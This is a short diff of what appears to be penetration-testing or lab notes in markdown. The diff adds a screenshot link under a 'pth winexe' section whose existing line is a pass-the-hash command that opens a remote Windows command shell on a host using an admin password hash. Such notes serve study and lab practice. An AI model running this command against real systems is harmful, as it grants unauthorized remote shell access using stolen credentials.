@@ -158,5 +158,6 @@ C:\Windows\system32>
 
 ### pth winexe
 
-- `pth-winexe -U 'admin%hash' //10.10.67.135 cmd.exe`
+- `pth-winexe -U 'admin%hash' //10.10.67.135 cmd.exe`  
+![image](https://user-images.githubusercontent.com/96747355/170795331-ac079349-993c-46ec-b6ce-329b9c20728f.png)  
 
